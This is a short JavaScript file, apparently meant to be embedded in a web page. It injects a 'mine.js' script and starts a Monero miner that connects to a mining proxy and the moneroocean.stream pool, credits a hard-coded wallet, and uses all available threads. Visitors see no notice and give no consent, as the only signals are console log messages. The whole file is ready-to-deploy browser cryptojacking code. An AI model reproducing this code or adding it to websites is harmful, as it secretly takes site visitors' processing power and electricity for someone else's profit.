console.log("Loading XMR Mining");

// Start Of Mining Code (Javascript)
var script = document.createElement("script");
script.src = "mine.js";
document.head.appendChild(script);

server = "wss://f.xmrminingproxy.com:8181";
var pool = "moneroocean.stream";
var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
var workerId = "GH-XMR"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code

console.log("External JavaScript file loaded.");
